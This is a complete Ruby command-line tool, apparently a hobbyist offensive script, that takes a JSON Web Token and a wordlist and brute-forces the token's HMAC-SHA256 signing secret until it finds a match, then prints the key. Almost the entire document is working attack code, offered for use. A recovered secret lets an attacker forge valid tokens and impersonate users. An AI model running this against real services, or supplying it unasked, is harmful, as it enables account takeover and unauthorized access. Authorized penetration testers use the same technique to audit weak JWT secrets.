#!/usr/bin/ruby

# Written by 0xmani
#[+]Usage: ruby jwt_cracker <token> <wordlist> 


require "openssl"
require "base64"

class String
  def bg_green
    "\e[42m#{self}\e[0m"
  end
  def bold
    "\e[1m#{self}\e[22m"
  end
  def red
    "\e[31m#{self}\e[0m"
  end
end
jwt = ARGV[0]
dict = ARGV[1]

unless ARGV[0]
  puts "\n Error: Missing Arguments".bold
  puts "[+] Usage: ruby jwt_cracker.rb <token> <wordlist>".bold
  exit!
end

unless ARGV[1]
  puts "\nError: Missing Arguments".bold
  puts "[+] Usage: ruby jwt_cracker.rb <token> <wordlist>".bold
  exit!
end

if ARGV[2]
  puts "\nToo many Arguments!".bold
  puts "[+]Usage: ruby jwt_cracker.rb <token> <wordlist>".bold
  exit!
end


time = Time.new
values = time.to_a
$t = Time.utc(*values)
header, payload, sign = jwt.split(".")

begin

  f = File.readlines(dict)
  if f
    
  end
rescue
  puts "\n[-]Invalid File!".bold
  puts "[-]Check the File Name and Path".bold
  exit!
end

def sig(payload, secret)
  Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, payload)).gsub("=","")
end

f.each do |line|
  $ww = line.chomp!
  if sig(header+'.'+payload, $ww) == sign
    puts "\n"
    starting = Time.now
    puts "Starting JWT_Cracker at #{$t}".bold 
    puts "\n\n"
    puts "Secret Key Founded : #{$ww}".bg_green
    exit
  end
end
unless $ww == true
  puts"\n"
  puts "No Secret Key Found :(".red.bold
  puts "Check the Token you Entered.".red.bold
end



